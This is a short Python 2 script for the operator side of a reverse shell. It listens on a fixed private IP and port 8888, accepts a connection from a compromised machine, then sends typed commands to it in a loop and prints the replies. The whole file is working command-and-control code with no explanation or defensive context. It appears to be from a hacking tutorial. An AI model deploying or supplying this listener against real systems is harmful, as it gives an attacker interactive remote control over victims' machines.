#!/usr/bin/env python

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# if we lose connection, we should be able to reestablish
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.225.179", 8888))
listener.listen(0)
print("[+] Waiting for incoming connection")
connection, address = listener.accept()
print("[+] Got a connection from " + str(address))

while True:
    command = raw_input("$-: ")
    connection.send(command)
    result = connection.recv(1024)
    print(result)
